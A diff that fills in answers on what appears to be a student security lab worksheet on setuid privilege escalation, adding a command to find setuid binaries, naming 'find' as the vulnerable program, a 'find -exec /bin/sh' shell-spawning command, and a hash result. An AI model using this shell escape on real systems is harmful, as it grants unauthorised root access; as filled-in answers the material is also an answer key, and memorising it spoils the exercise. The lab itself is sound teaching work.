@@ -123,7 +123,7 @@ Example:
   Command : find . php
 
 -->
-  Command : 
+  Command : find /usr/bin -perm -u=s -type f
 <--
 
 
@@ -133,21 +133,21 @@ Example:
   Program : passwd
 
 -->
-  Program : 
+  Program : find
 <--
 
 
 3. What command did you use to exploit the setUID vulnerability to spawn a shell.
 
 -->
-  Command : 
+  Command : find /usr/bin -exec /bin/sh \;
 <--
 
 
 4. What hash value is returned by running ./bin/task4 with your student ID.
 
 -->
-  Hash : 
+  Hash : 2d64d33c0317f34664a40464c5521b2321541c4bd53afba922268c7b4abbd31e
 <--
 
 
